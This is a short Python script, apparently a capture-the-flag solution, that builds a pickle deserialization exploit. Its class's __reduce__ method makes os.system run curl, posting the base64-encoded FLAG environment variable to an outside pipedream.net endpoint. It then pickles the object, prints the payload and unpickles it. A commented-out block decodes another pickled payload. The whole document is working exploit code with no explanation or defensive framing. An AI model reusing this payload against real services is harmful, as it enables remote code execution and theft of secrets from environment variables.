import os
flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')
'''
import pickle
import base64
byte = base64.b64decode('gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMDXJtIHBpY2tsZS5qcGeUhZRSlC4=')
print(byte)
tmp = pickle.loads(byte)
print(tmp.student)
'''
import pickle
import os
import urllib
import base64
class genpoc(object):
    def __reduce__(self):
        return os.system, ("curl https://enkmqp4uzg3jfmu.m.pipedream.net -d \"$(echo $FLAG| base64) \"",) 

e = genpoc()
poc = pickle.dumps(e)

print(poc)
print(base64.b64encode(poc)) 
print(pickle.loads(base64.b64decode(base64.b64encode(poc))))
